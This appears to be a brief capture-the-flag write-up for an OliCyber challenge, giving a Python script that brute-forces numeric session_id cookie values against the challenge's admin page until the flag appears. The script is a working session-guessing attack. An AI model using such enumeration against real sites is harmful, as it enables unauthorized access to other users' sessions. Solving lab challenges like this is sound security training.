# A TOO small reminder

## Solution

I chose to bruteforce the session-id of this challenge

```py
import requests
for i in range(300, 500):
    r = requests.get(f"http://too-small-reminder.challs.olicyber.it/admin", cookies={"session_id":f"{i}"})
    if "flag" in r.text.lower():
        print(r.text)
        break
    else:
        print(r.text.replace("\n", ""))
```
